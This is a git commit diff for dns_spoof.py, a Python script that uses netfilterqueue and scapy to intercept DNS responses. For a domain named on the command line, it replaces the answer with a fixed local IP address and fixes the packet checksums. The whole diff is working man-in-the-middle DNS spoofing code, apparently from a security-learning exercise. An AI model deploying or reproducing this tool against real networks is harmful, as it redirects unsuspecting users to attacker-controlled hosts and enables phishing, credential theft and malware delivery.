9a7cbf42f21343c69d6a30ea063f7f56131917ce
Logan Thomas <logannormanthomas@protonmail.com>
2023-05-22 03:22:58 -0400

    completed the dns spoofer as well as added a terminal argument to choose a domain without having to change the program

--- dns_spoof.py
+++ dns_spoof.py
@@ -1,11 +1,37 @@
 import netfilterqueue
 import scapy.all as scapy
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--domain", dest="domain", help="domain name you want to spoof")
+    options = parser.parse_args()
+    if not options.domain:
+        parser.error("[-] Please specify a domain, use --help for more info.")
+    return options
+
+
+options = get_arguments()
 
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
+        qname = scapy_packet[scapy.DNSQR].qname
+        if options.domain in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.193.128")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
 
